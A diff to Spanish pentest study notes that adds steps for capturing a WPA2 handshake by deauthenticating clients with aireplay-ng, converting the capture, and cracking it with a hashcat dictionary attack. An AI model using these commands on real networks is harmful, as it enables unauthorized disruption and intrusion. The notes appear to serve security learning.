@@ -829,7 +829,7 @@ airodump-ng -i wlan0mon
 
 > https://medium.com/hacking-info-sec/c%C3%B3mo-capturar-y-desencriptar-tr%C3%A1fico-en-wifi-wpa-wpa2-5fad004a5ea3
 
-> https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
+
 
 ## Captura del Handshake
 
@@ -837,6 +837,16 @@ airodump-ng -i wlan0mon
 aireplay-ng -0 10 -a <bssid> --ignore-negative-one <interfaz>
 
 ```
+
+Tienes que abrir otra ventana y desautenticas a los usuarios
+
+```
+aireplay-ng -0 10 -a <bssid> --ignore-negative-one <interfaz>
+
+```
+
+
+> Repetir este comando hasta que aparezca el handshake en la ventana en la que se está capturando la información. Este se muestra en la esquina superior derecha:
 
 
 
@@ -846,7 +856,21 @@ aireplay-ng -0 10 -a <bssid> --ignore-negative-one <interfaz>
 
 ![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/bc9ae5a7-1caf-45f6-9884-5c80a0cb55b5)
 
+## Crackear WPA2
 
+> https://node-security.com/posts/cracking-wpa2-with-hashcat/
+
+```
+cxpcapngtool wifiCapture-01.cap -o /home/user1/wifiHashes.txt
+
+````
+## Hashcat
+
+```
+ .\hashcat.exe -m 22000 -w 3 .\toCrack\wifiHashes.txt .\passwordLists\hashkiller-dict.txt
+```
+
+> https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
 
 ## Bibliografias 
 
